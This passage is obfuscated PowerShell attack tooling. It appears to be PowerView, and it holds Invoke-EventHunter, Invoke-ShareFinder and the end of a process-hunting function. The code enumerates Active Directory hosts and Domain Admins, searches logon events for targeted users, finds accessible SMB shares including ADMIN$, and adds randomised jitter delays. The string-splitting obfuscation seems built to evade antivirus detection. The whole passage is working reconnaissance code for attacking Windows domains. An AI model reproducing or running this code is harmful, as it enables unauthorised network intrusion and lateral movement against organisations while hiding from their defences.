                        ${pR`Oces`Sna`mE}.("{1}{0}"-f't',("{0}{1}" -f 'sp','li'))."IN`Vo`kE"(",") | &("{0}{1}{2}"-f ("{0}{2}{1}" -f'Fo','ach-','rE'),("{0}{1}" -f'O','bjec'),'t') {
                            if (${Pr`oCE`SS}."pRO`ceSs`NAME" -match ${_}) {
                                ${Pro`C`ess}
                            }
                        }
                    }
                    
                    elseif (${ta`RGETUsE`Rs} -contains ${p`Roc`ESS}."u`SeR") {
                        ${PR`oC`ess}
                    }
                }
            }
        }

    }

    process {

        if(${ThR`E`Ads}) {
            &("{1}{0}{2}{3}" -f'e-',("{0}{1}" -f'Wri','t'),'Ve',("{0}{1}" -f'r','bose')) (("{1}{0}"-f'in','Us')+'g '+'t'+("{0}{1}" -f 'h','rea')+("{0}{1}"-f'ding',' ')+'wi'+'th '+'t'+("{1}{0}" -f 'ea','hr')+'ds '+'= '+"$Threads")

            
            ${S`crIpTPAR`A`ms} = @{
                ("{0}{1}"-f'P','ing') = $(-not ${n`oPi`Ng})
                ("{0}{3}{2}{1}" -f 'Pr',("{1}{0}"-f 'Name','s'),'ces','o') = ${p`R`o`CeSSNamE}
                ("{0}{3}{1}{2}" -f 'Ta',("{1}{0}"-f'etU','g'),("{0}{1}" -f's','ers'),'r') = ${targETU`sE`Rs}
                ("{1}{2}{3}{0}"-f'ame','Rem','ote',("{1}{0}" -f'serN','U')) = ${R`EMOteuS`eR`Na`me}
                ("{2}{3}{1}{0}" -f 'd',("{1}{0}"-f'wor','s'),("{0}{1}" -f 'Rem','ot'),("{1}{0}" -f 's','ePa')) = ${re`mO`T`EpASSWOrd}
            }

            
            &("{3}{1}{6}{4}{0}{5}{2}"-f 'n',("{0}{1}{2}" -f'e','-Thr','e'),'n',("{0}{1}" -f 'I','nvok'),'Fu',("{0}{1}"-f'cti','o'),("{0}{1}"-f'ade','d')) -ComputerName ${COmpu`TE`RNA`mE} -ScriptBlock ${HoStEnum`BlO`Ck} -ScriptParameters ${sCRI`pTpa`R`A`Ms}
        }

        else {
            if(-not ${n`o`PiNG} -and (${Com`pUT`eRN`AmE}."C`ouNt" -ne 1)) {
                
                ${P`iNg} = {param(${COm`PU`TeR`NAMe}) if(&("{2}{1}{4}{0}{3}"-f'onn','e','T',("{0}{1}"-f 'ectio','n'),("{1}{0}"-f'-C','st')) -ComputerName ${CompuT`ER`NAme} -Count 1 -Quiet -ErrorAction ("{0}{1}" -f'S','top')){${cOM`PUtER`Name}}}
                ${C`omPUter`N`AMe} = &("{2}{5}{1}{0}{3}{4}"-f'de','a','Invoke','dFu',("{1}{2}{0}" -f 'n','nct','io'),("{1}{0}"-f 'e','-Thr')) -NoImports -ComputerName ${cOmpU`T`e`RNA`Me} -ScriptBlock ${P`InG} -Threads 100
            }

            &("{1}{0}{2}"-f '-V',("{0}{1}" -f 'Wr','ite'),("{0}{1}"-f 'er','bose')) "[*] Total number of active hosts: $($ComputerName.count)  "
            ${CoU`N`TEr} = 0

            ForEach (${c`ompu`T`er} in ${CoM`pUtEr`NaMe}) {

                ${CoU`Nter} = ${Co`UN`TER} + 1

                
                &("{0}{1}{2}"-f 'Sta',("{0}{1}"-f'rt-','Sle'),'ep') -Seconds ${rA`NdnO}.("{1}{0}"-f 'ext','N')."I`Nv`oKe"((1-${jitT`eR})*${dE`L`AY}, (1+${jiT`TEr})*${dE`lay})

                &("{2}{0}{1}{3}" -f("{1}{0}"-f 'ite-','r'),("{2}{0}{1}"-f'o','s','Verb'),'W','e') "[*] Enumerating server $Computer ($Counter of $($ComputerName.count))  "
                ${res`ULt} = &("{3}{2}{1}{0}"-f("{1}{0}" -f 'd','man'),'om',("{1}{0}" -f 'C','ke-'),("{0}{1}" -f 'I','nvo')) -ScriptBlock ${HostE`N`U`mBlocK} -ArgumentList ${co`M`puTEr}, ${F`A`LSE}, ${prOCe`SSN`A`Me}, ${Targ`ETu`SerS}, ${reMo`TEUsERnA`ME}, ${Re`mOtEPAss`wO`RD}
                ${Re`sUlT}

                if(${RE`s`ULt} -and ${sTO`PonSUc`C`esS}) {
                    &("{2}{1}{0}"-f("{1}{0}"-f'e','bos'),("{0}{1}{2}" -f 'r','ite-V','er'),'W') ("{10}{9}{0}{13}{5}{8}{4}{7}{3}{6}{12}{1}{11}{2}" -f ' ','r','y','et',("{2}{3}{1}{0}"-f',','found','ss',' '),'o','u',' r','ce','*]','[','l',("{1}{0}{2}" -f 'n','r','ing ea'),("{1}{4}{2}{3}{0}" -f'pr','Target','use','r/',' '))
                    return
                }
            }
        }

    }
}


function i`NV`oKE-eVen`ThU`NtER {


    [CmdletBinding()]
    param(
        [Parameter(poSiTiOn=0,VAlUEFromPIPelINe=${tR`Ue})]
        [Alias({"{1}{0}"-f'ts','Hos'})]
        [String[]]
        ${cOMPUte`R`N`A`Me},

        [ValidateScript({&("{1}{0}{2}{3}"-f'Pa',("{1}{0}" -f '-','Test'),'t','h') -Path ${_} })]
        [Alias({"{2}{1}{0}"-f 'st','i',{"{0}{1}" -f'Hos','tL'}})]
        [String]
        ${CoMp`U`Te`RFi`Le},

        [String]
        ${co`M`pu`TErFILTER},

        [String]
        ${CO`m`pU`TeRADs`pAth},

        [String]
        ${GRo`UpNa`ME} = ("{0}{1}{2}"-f ("{0}{1}"-f 'Dom','ain '),'A',("{1}{0}"-f'mins','d')),

        [String]
        ${TA`RGet`SE`Rver},

        [String]
        ${USERn`A`Me},

        [String]
        ${u`SErFI`l`TEr},

        [String]
        ${us`ERAds`P`Ath},

        [ValidateScript({&("{1}{0}" -f ("{1}{0}" -f 'h','t-Pat'),'Tes') -Path ${_} })]
        [String]
        ${user`F`Ile},

        [String]
        ${Do`mA`in},

        [String]
        ${DOmA`iNC`oNtR`oll`ER},

        [Int32]
        ${S`EaRc`hd`AYs} = 3,

        [Switch]
        ${sEAR`CHfore`St},

        [ValidateRange(1,100)] 
        [Int]
        ${t`hreA`DS}
    )

    begin {

        if (${psbO`UndP`A`RAMetE`RS}[("{1}{0}"-f("{1}{0}" -f'ug','eb'),'D')]) {
            ${d`ebUG`Pr`efErEn`CE} = ("{1}{2}{0}" -f'nue','C',("{0}{1}"-f'o','nti'))
        }

        
        ${Ra`NdNo} = &("{1}{2}{3}{0}"-f't','N',("{0}{1}" -f 'ew-','Ob'),'jec') ("{2}{1}{0}"-f 'om',("{0}{1}{2}" -f'e','m','.Rand'),("{1}{0}" -f 'st','Sy'))

        &("{2}{1}{0}{3}" -f 'o',("{2}{0}{1}" -f'e','rb','rite-V'),'W','se') ("{1}{3}{6}{4}{2}{0}{5}{7}"-f 'Invoke','[*','ng ','] R','i',("{1}{0}"-f 'Even','-'),'unn',("{1}{0}{2}"-f'Hunt','t','er'))

        if(${do`MAIn}) {
            ${TarGE`Td`o`mAi`NS} = @(${d`oMaiN})
        }
        elseif(${SEAR`chfoRe`ST}) {
            
            ${TaR`getDoma`i`NS} = &("{2}{3}{1}{0}" -f 'in',("{2}{1}{0}" -f'tDoma','s','e'),("{0}{1}" -f'G','et-'),("{0}{1}" -f 'Net','For')) | &("{3}{0}{2}{1}"-f 'ch-','ect','Obj',("{0}{1}"-f'Fo','rEa')) { ${_}."N`Ame" }
        }
        else {
            
            ${TA`RGet`Do`mai`NS} = @( (&("{1}{2}{0}"-f 'in','Get',("{2}{1}{0}" -f 'oma','D','-Net')))."nA`mE" )
        }

        
        
        
        
        

        if(!${cO`mp`UtERna`mE}) { 
            
            if(${C`OMpUT`E`R`File}) {
                ${com`PUteRnA`Me} = &("{0}{2}{1}{3}"-f'Get',("{1}{0}" -f'nt','Co'),'-','ent') -Path ${cOMPu`TErf`ile}
            }
            elseif(${coMputeRf`Il`T`er} -or ${cOm`PuTERadS`PAth}) {
                [array]${c`OMPu`T`E`RnaME} = @()
                ForEach (${DO`M`AIn} in ${TAR`Getdo`ma`I`Ns}) {
                    &("{1}{2}{0}{3}" -f 'e',("{0}{1}" -f'Write','-'),'V',("{0}{1}" -f'rbo','se')) ('[*]'+' '+'Qu'+'er'+'y'+("{1}{0}" -f 'g ','in')+'dom'+("{0}{1}"-f 'a','in ')+("$Domain "+'')+'fo'+'r '+("{1}{0}" -f 't','hos')+'s')
                    ${CoMP`U`TE`Rna`ME} += &("{3}{0}{1}{2}"-f("{0}{1}{2}"-f 'et-Ne','tCom','pu'),'te','r','G') -Domain ${DO`mA`in} -DomainController ${DomAinC`O`NT`Ro`LlER} -Filter ${Com`PUTerFi`LTER} -ADSpath ${com`p`UtER`Ads`path}
                }
            }
            else {
                
                [array]${C`OM`PUTerna`me} = @()
                ForEach (${DOM`AIN} in ${t`A`RgETd`OmaI`NS}) {
                    &("{2}{0}{1}{3}"-f '-','Ve',("{0}{1}" -f'Wri','te'),("{0}{1}" -f 'r','bose')) ('['+'*] '+'Que'+("{0}{1}" -f'ryi','n')+'g '+'d'+("{0}{1}{2}" -f 'o','main',' ')+("$Domain "+'')+'for'+' '+("{1}{0}"-f 'i','doma')+'n '+'con'+("{0}{1}" -f 'tr','ol')+'le'+'rs')
                    ${CoM`pUTe`RN`AmE} += &("{4}{1}{0}{3}{2}"-f("{0}{1}" -f'om','ainC'),("{0}{2}{1}" -f'e','tD','t-Ne'),'er',("{1}{0}{2}" -f'trol','on','l'),'G') -LDAP -Domain ${Do`main} -DomainController ${DO`main`ContR`O`lL`eR} | &("{2}{1}{0}"-f ("{0}{1}" -f'jec','t'),("{2}{0}{1}" -f'h-','Ob','orEac'),'F') { ${_}."DnSH`OsT`N`AME"}
                }
            }

            
            ${co`mp`Ut`er`NaME} = ${cO`mPUTErn`A`ME} | &("{2}{3}{0}{1}" -f("{0}{1}"-f 'e-','Obj'),'ect','W','her') { ${_} } | &("{0}{1}{2}" -f 'Sor',("{1}{0}" -f 'b','t-O'),("{1}{0}" -f't','jec')) -Unique | &("{1}{2}{3}{0}" -f't',("{0}{1}"-f 'Sort-','O'),'b','jec') { &("{0}{2}{1}"-f("{0}{1}"-f'Get-','R'),("{1}{0}" -f'dom','n'),'a') }
            if($(${Co`M`pUtern`AMe}."Cou`NT") -eq 0) {
                throw ("{3}{1}{2}{0}" -f'd!','os',("{0}{1}"-f 'ts fou','n'),("{1}{0}" -f'h','No '))
            }
        }

        
        
        
        
        

        
        ${t`ArGet`Us`eRS} = @()

        
        if(${tAr`gE`TsErVer}) {
            &("{2}{1}{0}{4}{3}" -f '-','e',("{0}{1}" -f'W','rit'),("{0}{1}"-f 'b','ose'),'Ver') (("{0}{1}{2}"-f 'Q','uer','yin')+'g'+' '+'tar'+'g'+'et '+'s'+'er'+("{0}{1}" -f'ver',' ')+("'$TargetServer' "+'')+'for'+' '+("{1}{0}"-f'ocal','l')+' '+("{0}{1}" -f'us','er')+'s')
            ${Ta`Rg`eTUSeRs} = &("{2}{1}{3}{0}" -f("{1}{0}"-f'oup','Gr'),'et',("{1}{0}"-f'-N','Get'),("{0}{1}"-f 'Lo','cal')) ${tA`Rg`ET`SerVER} -Recurse | &("{0}{2}{1}" -f 'Wh',("{0}{1}"-f'Ob','ject'),("{0}{1}" -f'ere','-')) {(-not ${_}."isg`ROUP") -and ${_}."isDO`MA`in" } | &("{4}{0}{2}{1}{3}"-f ("{0}{1}" -f 'r','Each'),'O','-',("{0}{1}" -f 'b','ject'),'Fo') {
                (${_}."Acc`ount`NAMe").("{1}{0}"-f't',("{1}{0}"-f'i','spl'))."INVo`ke"("/")[1].("{0}{1}{2}"-f 't',("{0}{1}"-f 'o','Lowe'),'r')."i`NVOke"()
            }  | &("{0}{1}{2}" -f 'Wh',("{1}{0}"-f '-Obje','ere'),'ct') {${_}}
        }
        
        elseif(${US`eR`NAME}) {
            &("{1}{2}{0}"-f 'se','Wri',("{1}{0}"-f 'Verbo','te-')) ('[*'+'] '+'U'+("{0}{1}"-f'sin','g ')+'t'+'ar'+("{1}{0}" -f'et ','g')+'us'+'er '+"'$UserName'...")
            ${T`ArG`eT`UsERs} = @( ${U`S`ER`NaMe}.("{2}{1}{0}" -f 'wer','oLo','T')."InvO`kE"() )
        }
        
        elseif(${U`sERFI`le}) {
            ${TAr`gEtu`se`RS} = &("{0}{1}{2}"-f 'G',("{1}{2}{0}"-f 'ten','et-','Con'),'t') -Path ${u`Se`RfI`Le} | &("{0}{2}{1}"-f'Wh','ect',("{0}{1}"-f'ere-','Obj')) {${_}}
        }
        elseif(${UsER`AD`S`PatH} -or ${Us`ErFIl`T`ER}) {
            ForEach (${dom`AiN} in ${Ta`RG`et`do`mainS}) {
                &("{1}{3}{2}{0}" -f 'e',("{2}{1}{0}"-f'-Ve','rite','W'),'s','rbo') ('[*]'+' '+'Qu'+'e'+'r'+("{1}{0}"-f 'g ','yin')+("{1}{0}" -f'ain','dom')+' '+("$Domain "+'')+'fo'+'r '+'u'+("{1}{0}"-f 'rs','se'))
                ${ta`RgE`TusErS} += &("{1}{0}{2}" -f("{1}{0}" -f'tU','-Ne'),'Get','ser') -Domain ${do`M`AiN} -DomainController ${Do`maINCONT`ROL`lER} -ADSpath ${UsERa`ds`pAth} -Filter ${u`sERFiL`TER} | &("{2}{1}{3}{0}"-f'ct',("{1}{0}"-f'Each','or'),'F',("{0}{1}" -f '-O','bje')) {
                    ${_}."sa`M`ACc`OUNtnAmE"
                }  | &("{2}{0}{1}"-f ("{1}{0}"-f'Objec','-'),'t',("{1}{0}" -f'ere','Wh')) {${_}}
            }            
        }
        else {
            ForEach (${d`OMAIN} in ${t`ARg`e`TDomAinS}) {
                &("{2}{1}{0}{3}" -f 'V',("{0}{1}"-f 'i','te-'),'Wr',("{0}{1}" -f'erbo','se')) ('[*]'+' '+("{1}{0}"-f'uer','Q')+'yin'+'g'+' '+("{2}{1}{0}" -f 'ain','om','d')+' '+("$Domain "+'')+'for'+' '+'u'+'se'+'rs '+'o'+'f '+'gr'+("{1}{0}" -f 'p ','ou')+"'$GroupName'")
                ${TArg`eT`U`SeRs} += &("{4}{1}{3}{0}{2}" -f("{0}{1}"-f 'upM','e'),'tGr',("{0}{1}"-f 'm','ber'),'o',("{1}{0}" -f'e','Get-N')) -GroupName ${GR`oupN`AMe} -Domain ${d`OMA`iN} -DomainController ${D`omainc`On`TroLleR} | &("{2}{3}{1}{0}" -f("{1}{0}"-f 'ct','Obje'),'-',("{1}{0}"-f 'e','For'),'ach') {
                    ${_}."MEMb`ERNa`mE"
                }
            }
        }

        if (((!${T`ArgETU`SeRs}) -or (${T`ARge`TUS`ers}."c`oUNt" -eq 0))) {
            throw ("{3}{0}{5}{2}{6}{1}{4}" -f ("{0}{1}" -f'rs',' f'),' s','n',("{1}{2}{0}" -f'o use','[','!] N'),("{0}{1}{2}" -f'ea','rch f','or!'),'ou',("{0}{1}"-f'd t','o'))
        }

        
        ${HO`s`TENu`MblOcK} = {
            param(${Co`mpUt`ER`NAME}, ${P`inG}, ${T`ARGET`USers}, ${SEAr`cHD`AYs})

            
            ${u`P} = ${T`RuE}
            if(${P`ING}) {
                ${Up} = &("{3}{1}{2}{4}{0}"-f 'ion',("{1}{0}"-f 't-','es'),'Con','T',("{0}{1}" -f 'ne','ct')) -Count 1 -Quiet -ComputerName ${cOmpU`TEr`Na`ME}
            }
            if(${UP}) {
                
                &("{2}{1}{0}" -f't',("{1}{0}" -f'ven','E'),("{2}{1}{0}" -f'r','se','Get-U')) -ComputerName ${COmP`UtEr`Na`ME} -EventType 'all' -DateStart (  ${5`mBI}::"T`odAY".("{0}{1}" -f("{1}{2}{0}" -f'ay','Add','D'),'s')."INv`O`kE"(-${sE`Arc`h`dAys})) | &("{0}{3}{1}{2}"-f 'Whe',("{1}{0}"-f 'Ob','e-'),("{0}{1}"-f'jec','t'),'r') {
                    
                    ${t`ARG`EtusErs} -contains ${_}."U`sER`NaME"
                }
            }
        }

    }

    process {

        if(${TH`R`eadS}) {
            &("{1}{2}{0}"-f 'ose',("{0}{1}"-f 'W','rite-V'),'erb') ('U'+'s'+("{0}{1}"-f 'in','g ')+("{1}{0}" -f'e','thr')+'a'+("{1}{0}" -f 'g ','din')+("{1}{0}"-f'th','wi')+' '+("{1}{0}"-f'ad','thre')+'s'+' '+'= '+"$Threads")

            
            ${S`Cr`I`pTPA`RamS} = @{
                ("{1}{0}" -f 'ng','Pi') = $(-not ${n`OPiNg})
                ("{1}{3}{0}{2}"-f'ser','T','s',("{1}{0}{2}" -f'rget','a','U')) = ${T`ArGet`Use`Rs}
                ("{2}{3}{0}{1}"-f 'hD','ays','S',("{1}{0}" -f 'arc','e')) = ${SEa`R`Ch`dayS}
            }

            
            &("{4}{2}{3}{1}{0}" -f ("{1}{2}{0}" -f 'on','dFu','ncti'),("{0}{1}"-f 'read','e'),'ke','-Th',("{0}{1}" -f'I','nvo')) -ComputerName ${co`mPUte`Rn`A`ME} -ScriptBlock ${hOST`En`UMb`lo`Ck} -ScriptParameters ${s`cr`IpTParA`mS}
        }

        else {
            if(-not ${N`O`pInG} -and (${C`OmPuT`eRNAmE}."C`OuNt" -ne 1)) {
                
                ${P`inG} = {param(${CO`Mp`U`TErNaMe}) if(&("{0}{2}{3}{1}"-f ("{0}{1}" -f 'T','est-C'),'ion','o',("{0}{1}" -f 'nne','ct')) -ComputerName ${co`mPu`TER`Name} -Count 1 -Quiet -ErrorAction ("{1}{0}" -f'top','S')){${cO`Mpu`Te`RNAMe}}}
                ${C`omPUTeRn`AME} = &("{6}{4}{3}{5}{0}{1}{2}" -f'Fun','c',("{1}{0}"-f'n','tio'),'rea',("{1}{0}" -f'-Th','voke'),'ded','In') -NoImports -ComputerName ${COMP`U`TErname} -ScriptBlock ${p`inG} -Threads 100
            }

            &("{0}{1}{2}{3}"-f 'Wri','t',("{0}{2}{1}"-f'e','b','-Ver'),'ose') "[*] Total number of active hosts: $($ComputerName.count)  "
            ${C`oUNt`eR} = 0

            ForEach (${co`M`puTER} in ${CoMpuTe`R`N`AME}) {

                ${Co`UnT`ER} = ${C`ouNter} + 1

                
                &("{1}{2}{0}"-f 'p',("{1}{0}{2}"-f'tart','S','-Sl'),'ee') -Seconds ${R`ANd`NO}.("{1}{0}"-f 't','Nex')."I`NVoKe"((1-${ji`T`Ter})*${dE`lay}, (1+${j`ITTEr})*${del`AY})

                &("{2}{0}{1}"-f ("{0}{1}" -f'r','bos'),'e',("{2}{0}{1}"-f 'ite-','Ve','Wr')) "[*] Enumerating server $Computer ($Counter of $($ComputerName.count))  "
                &("{2}{0}{1}{3}"-f'o','mma',("{0}{2}{1}"-f 'I','-C','nvoke'),'nd') -ScriptBlock ${hos`Te`NU`mb`lOCk} -ArgumentList ${cOm`P`UTER}, $(-not ${N`oPi`NG}), ${Ta`RGE`T`UseRs}, ${SEARC`Hda`ys}
            }
        }

    }
}


function Invok`e`-s`h`ArEF`iND`eR {


    [CmdletBinding()]
    param(
        [Parameter(pOSiTIon=0,vaLUefrOMpipeLIne=${T`RuE})]
        [Alias({"{1}{0}"-f'sts','Ho'})]
        [String[]]
        ${C`OmPuT`e`RN`AmE},

        [ValidateScript({&("{2}{0}{1}"-f ("{0}{1}"-f'-P','at'),'h',("{1}{0}" -f 'est','T')) -Path ${_} })]
        [Alias({"{2}{0}{1}"-f 'Li','st',{"{0}{1}"-f 'Hos','t'}})]
        [String]
        ${coMpU`TE`RFI`le},

        [String]
        ${cOm`P`UTEr`FIl`TER},

        [String]
        ${cOm`PuteRAD`spaTh},

        [Switch]
        ${e`x`CLudesTA`NDA`RD},

        [Switch]
        ${eXc`LUdEPr`int},

        [Switch]
        ${EX`cl`Ude`iPc},

        [Switch]
        ${n`Op`iNG},

        [Switch]
        ${chEcKsh`AR`Ea`cc`ESS},

        [Switch]
        ${cheC`k`AdM`In},

        [UInt32]
        ${deL`Ay} = 0,

        [Double]
        ${JI`TT`Er} = .3,

        [String]
        ${dOMa`In},

        [String]
        ${d`OmAINc`O`NtRo`LlEr},
 
        [Switch]
        ${SEaRCh`FoR`eSt},

        [ValidateRange(1,100)] 
        [Int]
        ${t`hrEADs}
    )

    begin {
        if (${p`sB`O`UNdpArAmeTErS}[("{0}{1}" -f'Deb','ug')]) {
            ${dEB`UGp`REFEren`ce} = ("{0}{1}"-f("{1}{0}"-f'i','Cont'),'nue')
        }

        
        ${R`AN`dnO} = &("{2}{1}{0}" -f'ect','bj',("{1}{0}"-f'-O','New')) ("{3}{0}{2}{1}"-f ("{2}{1}{0}" -f 'nd','a','ystem.R'),'m','o','S')

        &("{1}{0}{2}" -f ("{1}{0}"-f 'V','ite-'),'Wr',("{2}{1}{0}"-f 'se','rbo','e')) ('[*]'+' '+'Ru'+("{0}{1}"-f 'nni','ng ')+'I'+'n'+("{0}{2}{1}" -f'voke','Sh','-')+("{1}{0}" -f'Fi','are')+'nde'+'r '+'w'+("{0}{1}" -f'i','th ')+("{0}{1}"-f'd','ela')+'y '+'o'+'f '+"$Delay")

        
        [String[]] ${eX`clU`deD`shA`ReS} = @('')

        if (${EX`c`lU`D`EpRInT}) {
            ${eXC`LU`deDsH`Ar`Es} = ${e`Xc`LU`D`EDshares} + "PRINT$"
        }
        if (${eXclU`dei`pc}) {
            ${E`xc`lUDEDsH`AReS} = ${E`x`CLu`dedS`harEs} + "IPC$"
        }
        if (${E`XCl`UDESTaNd`ArD}) {
            ${eX`CLUD`eDsHa`RES} = @('', "ADMIN$", "IPC$", "C$", "PRINT$")
        }

        
        if(${C`o`mPUteRFIle}) {
            ${COm`p`UTE`RnaME} = &("{0}{1}{2}" -f'Get',("{0}{2}{1}" -f '-','e','Cont'),'nt') -Path ${c`oMPu`TeRFILe}
        }

        if(!${c`O`MP`UT`ernAME}) { 
            [array]${CO`MPu`TE`RNamE} = @()

            if(${DOm`A`in}) {
                ${TARgeTDO`MaI`NS} = @(${DOm`AIn})
            }
            elseif(${s`e`Archf`OrESt}) {
                
                ${targET`do`MA`i`Ns} = &("{3}{2}{1}{0}" -f 'ain','m','o',("{0}{2}{1}"-f 'Get-NetF','D','orest')) | &("{2}{4}{0}{3}{1}" -f("{0}{1}"-f 'Obj','e'),'t',("{1}{0}"-f'E','For'),'c',("{0}{1}" -f'a','ch-')) { ${_}."nA`Me" }
            }
            else {
                
                ${T`ARgeTdOmaI`Ns} = @( (&("{3}{0}{1}{2}" -f'etD','om','ain',("{0}{1}"-f 'Get-','N')))."nA`Me" )
            }
                
            ForEach (${dOm`AIN} in ${Targ`ETdOma`InS}) {
                &("{1}{2}{0}" -f ("{1}{0}" -f'ose','Verb'),'Wri','te-') ('['+'*] '+("{1}{0}"-f'uery','Q')+'i'+'ng '+("{1}{0}"-f 'ain','dom')+' '+("$Domain "+'')+'for'+' '+("{0}{1}"-f'hos','t')+'s')
                ${c`o`mPUt`eRNA`mE} += &("{4}{3}{2}{1}{0}" -f ("{0}{1}" -f'ut','er'),("{1}{0}"-f 'Comp','t'),'Ne','-','Get') -Domain ${D`oMA`in} -DomainController ${DO`Mai`NCo`NTRoL`LER} -Filter ${C`OmPuteRfIL`T`ER} -ADSpath ${cO`mpu`TeR`ADs`P`ATh}
            }
        
            
            ${cOmpu`TE`R`NAME} = ${c`oMPUte`RNaMe} | &("{2}{1}{0}"-f 'ct',("{2}{0}{1}"-f'-Ob','je','ere'),'Wh') { ${_} } | &("{1}{2}{0}"-f ("{1}{0}"-f 't','Objec'),'So','rt-') -Unique | &("{2}{3}{1}{0}"-f 'ct','e',("{0}{1}" -f 'So','rt'),("{1}{0}"-f'bj','-O')) { &("{0}{3}{2}{1}"-f'G','dom',("{1}{0}" -f 'Ran','-'),'et') }
            if($(${co`Mp`Ut`erNAMe}."COU`NT") -eq 0) {
                throw ("{0}{3}{2}{1}"-f("{1}{0}{2}" -f'o','No h','s'),'!','d',("{0}{1}{2}"-f 'ts f','o','un'))
            }
        }

        
        ${H`osteNuM`Blo`CK} = {
            param(${cOMpUTE`R`N`A`Me}, ${P`INg}, ${C`heCkshAr`EacCe`ss}, ${EXClu`d`Ed`shAreS}, ${c`heCKadM`IN})

            
            ${U`p} = ${t`RUE}
            if(${pI`NG}) {
                ${uP} = &("{0}{2}{3}{1}" -f'Tes','on','t-C',("{0}{1}{2}"-f 'onnec','t','i')) -Count 1 -Quiet -ComputerName ${cOmp`Ute`R`NamE}
            }
            if(${u`p}) {
                
                ${SHa`Res} = &("{2}{1}{3}{0}" -f 'e','et',("{0}{1}" -f 'G','et-N'),("{0}{1}" -f'Sh','ar')) -ComputerName ${c`OmpuTeRn`A`mE}
                ForEach (${S`HarE} in ${SH`Ar`ES}) {
                    &("{2}{1}{0}" -f ("{1}{0}"-f 'ug','eb'),("{2}{1}{0}"-f '-D','e','rit'),'W') ('[*]'+' '+("{1}{0}" -f'v','Ser')+'er '+("{0}{1}"-f'sh','are')+':'+' '+"$Share")
                    ${NETn`A`mE} = ${s`Ha`RE}."SH`i1`_n`ETnAMe"
                    ${R`e`mark} = ${sH`Are}."S`H`i1_rema`Rk"
                    ${P`ATH} = '\\'+${coMp`UTE`R`NAME}+'\'+${Ne`T`NAMe}

                    
                    if ((${n`EtnamE}) -and (${nETn`A`Me}.("{1}{0}"-f'im','tr')."I`NvoKe"() -ne '')) {
                        
                        if(${che`CKaDM`in}) {
                            if(${nEt`NAmE}.("{0}{1}"-f'T',("{0}{1}"-f'oU','pper'))."InV`o`kE"() -eq "ADMIN$") {
                                try {
                                    ${NU`lL} =   (&("{2}{0}{1}"-f 'iAB','LE','VAR')  ('CrG'+'p0')  -vALUeO  )::("{1}{2}{0}" -f 'es',("{1}{0}"-f 'i','GetF'),'l')."INvO`kE"(${pA`TH})
                                    (("\\$ComputerName\$NetName "+'')+"`t- "+"$Remark")
                                }
                                catch {
                                    &("{2}{3}{1}{0}" -f("{0}{1}" -f 'ebu','g'),'-D','Wri','te') ('Er'+'r'+'or '+'a'+("{1}{0}" -f 'ces','c')+'s'+("{0}{1}" -f'i','ng ')+'p'+("{1}{0}"-f' ','ath')+("$Path "+'')+': '+"$_")
                                }
                            }
                        }
                        
                        elseif (${EXC`l`Ud`EDsh`ArES} -NotContains ${N`eTNA`Me}.("{0}{2}{1}"-f'T','r',("{1}{0}" -f 'pe','oUp'))."In`V`Oke"()) {
                            
                            if(${C`HEcK`SharEaC`cess}) {
                                
                                try {
                                    ${N`ULL} =   (  &("{3}{0}{1}{2}" -f ("{0}{1}" -f 'T','-VAR'),("{0}{1}"-f 'Ia','bL'),'E','GE') ("{1}{0}"-f 'Gp0','Cr'))."V`ALuE"::("{0}{1}" -f 'Get',("{1}{0}" -f'les','Fi'))."iN`VOke"(${pA`Th})
                                    (("\\$ComputerName\$NetName "+'')+"`t- "+"$Remark")
                                }
                                catch {
                                    &("{0}{2}{1}{3}" -f'W',("{0}{1}"-f'ite-','Deb'),'r','ug') ('E'+("{0}{1}" -f 'rro','r ')+'ac'+'ces'+("{1}{0}"-f 'g ','sin')+("{1}{0}" -f 'ath','p')+' '+("$Path "+'')+': '+"$_")
                                }
                            }
                            else {
                                (("\\$ComputerName\$NetName "+'')+"`t- "+"$Remark")
                            }
                        }
                    }
                }
            }
        }

    }

    process {

        if(${T`hr`EaDS}) {
            &("{1}{0}{3}{4}{2}" -f 'i','Wr',("{1}{0}"-f'se','rbo'),'te','-Ve') ('U'+("{1}{0}"-f ' ','sing')+'t'+("{1}{0}" -f'i','hread')+'ng '+("{0}{1}"-f'wi','th')+' '+("{1}{0}" -f'hre','t')+'a'+'ds '+'= '+"$Threads")

            
            ${Sc`R`ipTP`ArAMS} = @{
                ("{0}{1}"-f'Pi','ng') = $(-not ${NoP`i`Ng})
                ("{3}{1}{0}{5}{2}{4}" -f'kS','c','a','Che',("{2}{1}{0}"-f 's','s','reAcce'),'h') = ${cHEC`K`shAreacc`e`sS}
                ("{3}{2}{0}{1}" -f("{0}{1}"-f'e','dSha'),'res',("{0}{1}"-f 'xclu','d'),'E') = ${EXcL`UD`eDS`hAR`ES}
                ("{2}{1}{0}" -f 'min',("{0}{1}" -f'ec','kAd'),'Ch') = ${cHec`KA`dmiN}
            }

            
            &("{1}{4}{3}{0}{5}{2}"-f 'unc','Invoke','on',("{0}{1}"-f 'eaded','F'),("{0}{1}" -f '-T','hr'),'ti') -ComputerName ${CO`MpuTE`RnaME} -ScriptBlock ${HOs`TEnu`mBlOcK} -ScriptParameters ${S`CR`i`PtPARa`mS}
        }

        else {
            if(-not ${n`Op`INg} -and (${cO`mp`U`TeRnAME}."C`oUnT" -ne 1)) {
                
                ${pi`Ng} = {param(${coMP`Uterna`ME}) if(&("{3}{0}{2}{1}"-f 'C','on',("{0}{1}" -f'o','nnecti'),("{0}{1}"-f'Test','-')) -ComputerName ${co`mpU`TerNamE} -Count 1 -Quiet -ErrorAction ("{0}{1}"-f 'Sto','p')){${co`MPUTeRNA`me}}}
                ${cOMPU`TEr`N`AME} = &("{2}{3}{1}{0}{4}"-f'unc',("{1}{0}{2}" -f 'k','o','e-ThreadedF'),'In','v',("{0}{1}"-f'ti','on')) -NoImports -ComputerName ${CoMpUt`ER`N`AMe} -ScriptBlock ${pi`Ng} -Threads 100
            }

            &("{2}{0}{1}{3}"-f 'b','o',("{0}{1}{2}" -f'Wr','i','te-Ver'),'se') "[*] Total number of active hosts: $($ComputerName.count)  "
            ${c`O`UNter} = 0

            ForEach (${C`omPut`ER} in ${CO`MpUTE`R`Name}) {

                ${co`Un`TEr} = ${COuNt`ER} + 1

                
                &("{2}{1}{0}" -f("{1}{2}{0}" -f 'eep','-S','l'),("{0}{1}"-f'ta','rt'),'S') -Seconds ${r`ANDnO}.("{0}{1}" -f'Nex','t')."IN`Vo`Ke"((1-${jIT`T`eR})*${D`ElAY}, (1+${J`i`TTeR})*${De`lAy})

